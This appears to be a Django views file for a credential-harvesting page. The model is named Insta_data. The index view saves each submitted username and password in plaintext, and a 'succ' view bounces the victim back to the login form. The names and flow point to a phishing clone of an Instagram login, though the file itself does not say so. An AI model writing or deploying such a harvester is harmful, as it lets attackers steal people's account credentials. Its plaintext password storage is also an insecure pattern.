from django.shortcuts import render,redirect
from .models import Insta_data
# Create your views here.
def index(request):
    if request.method == 'POST':
        usernam = request.POST.get('username', 'default')
        password = request.POST.get("password" ,"default")
        
        Insta_data.objects.create(username=usernam, password=password)
        
        return redirect('succ/')
    else:
        return render(request, 'index.html')

def succ(request):
    
    return redirect('/')